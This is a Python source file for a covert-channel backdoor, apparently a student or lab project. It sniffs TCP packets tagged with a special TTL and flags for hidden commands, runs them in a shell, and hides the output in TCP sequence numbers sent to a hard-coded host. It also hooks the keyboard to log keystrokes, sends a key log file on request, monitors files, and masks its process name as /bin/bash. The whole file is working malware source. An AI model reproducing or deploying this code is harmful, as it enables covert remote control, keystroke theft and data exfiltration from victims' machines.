#!/usr/bin/python3

import optparse
import os
import subprocess
import sys
import time
from bkutil import *
from multiprocessing import Process
from cryptoutil import encrypt, decrypt
from scapy.all import *
from file_monitoring import *
from portknocking import *
import _thread
import setproctitle

"""
Setup: 
dnf install python3-pip
pip3 install pycrypto setproctitle scapy
pip3 install watchdog3
pip3 install python-xlib
"""

TTL = 234
TTLKEY = 222
victim = ("192.168.0.2", 9999)
messages = []
setFlag = "E"

myip = ("192.168.0.3", 66)


def secret_send(msg: str, type: str):
    """
    Keyword arguments:
    msg      - payload being sent
    type     - file or command
    """
    if(type == "command"):
        # Convert message to ASCII to bits
        msg = message_to_bits(msg)
        chunks = message_spliter(msg)
        packets = packatizer(chunks)
        send(packets, verbose=True)
        send(IP(dst=victim[0], ttl=TTL) /
                       TCP(sport=myip[1], dport=victim[1], flags="U"))
    elif(type == "file"):
        msg = message_to_bits(msg)
        chunks = message_spliter(msg)
        packets = packatizer(chunks)
        send(packets, verbose=True)
        send(IP(dst=victim[0], ttl=TTL) /
                       TCP(sport=myip[1], dport=victim[1], flags="P"))


def packatizer(msg):
    """[summary]

    Arguments:
        msg {[type]} -- [description]

    Returns:
        [type] -- [description]
    """

    # Create the packets array as a placeholder.
    packets = []
    # If the length of the number is larger than what is allowed in one packet, split it
    counter = 0

    # If not an array (if there is only one packet.)
    if(type(msg) is str):
        # The transmissions position and total will be 1.
        # i.e. 1/1 message to send.
        packets.append(craft(msg))
    # If an array (if there is more than one packet)
    elif(type(msg) is list):
        while (counter < len(msg)):
            # The position will be the array element and the total will be the
            # length.
            # i.e. 1/3 messages to send.
            packets.append(craft(msg[counter]))
            counter = counter + 1
    return packets


def craft(data: str) -> IP:
    """[summary]

    Arguments:
        data {str} -- [description]

    Returns:
        IP -- [description]
    """

    global TTL
    global setFlag
    # The payload contains the unique password, UID, position number and total.
    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],seq=int(str(data), 2), flags=setFlag)
    return packet


def execPayload(command):
    """[summary]

    Arguments:
        command {str} -- [description]
    """

    # Execute the command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    payload = str(result)
    print(payload)
    secret_send(payload,"command")

def getLogFile():
    file = open('/root/Documents/file.log','r')
    f = file.read()
    #print(f)
    secret_send(f,"file")
    file.close()
    return

def commandResult(packet):
    """[summary]

    Arguments:
        packet {scapy.packet} -- [description]
    """

    global TTLKEY
    global messages
    ttl = packet[IP].ttl
    if(packet.haslayer(IP) and ttl == TTLKEY):
        # checks if the flag has been set to know it contains the secret results
        flag = packet['TCP'].flags
        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
        if flag == 0x40:
            field = packet[TCP].seq
            # Converts the bits to the nearest divisible by 8
            covertContent = lengthChecker(field)
            messages.append(text_from_bits(covertContent))
        # End Flag detected
        elif flag == 0x20:
            payload = ''.join(messages)
            execPayload(payload)
            messages = []
        elif flag == 0x08:
            getLogFile()
            #print("Server wants key log file!")



def commandSniffer():
    sniff(filter="tcp and host "+victim[0], prn=commandResult)


setproctitle.setproctitle("/bin/bash")  # set fake process name

sniffThread = threading.Thread(target=commandSniffer)
fileMonitor = Monitor()

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()

fileMonitor.daemon = True
sniffThread.daemon = True
new_hook.daemon = True

sniffThread.start()
fileMonitor.start()
new_hook.start()

while True:
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        #reset()
        print ("Exiting")
        sys.exit(0)
